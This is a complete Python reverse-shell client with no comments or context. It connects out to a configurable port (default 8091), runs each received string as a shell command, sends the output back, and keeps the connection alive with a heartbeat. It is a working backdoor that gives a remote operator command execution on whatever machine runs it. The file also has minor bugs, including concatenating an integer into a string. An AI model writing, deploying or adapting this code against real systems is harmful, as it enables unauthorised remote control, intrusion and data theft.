import socket
import os
import subprocess
import sys
import multiprocessing
import time
import threading

host = ''
port = int(sys.argv[1])
port = port if port else 8091




def worker(q):

    s = socket.socket()
    s.connect((host, port))
    s.send(b' ')

    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))

            print(output_str)

def heartbeat(q):
    s = socket.socket()
    s.connect((host, port))
    s.send("heartbeat".encode())
    failed_hb = 1

    while True:
        time.sleep((3))
        try:
            s.send(str.encode(' '))
            s.recv(1024)
        except:
            print("server is down, try:"+failed_hb)

            failed_hb += 1
            continue
        else:
            if failed_hb > 10:
                break
    s.close()


def run():
    q = ""
    p1 = multiprocessing.Process(target=worker, args=(q,))
    #p1 = threading.Thread(target=worker, args=(q))
    #p1.daemon=True



    p2 = multiprocessing.Process(target=heartbeat, args=(q,))
    #p2 = threading.Thread(target=heartbeat, args=(q))
    p2.daemon=True

    p1.start()
    p2.start()

if __name__ == '__main__':
    run()
    while True:
        pass


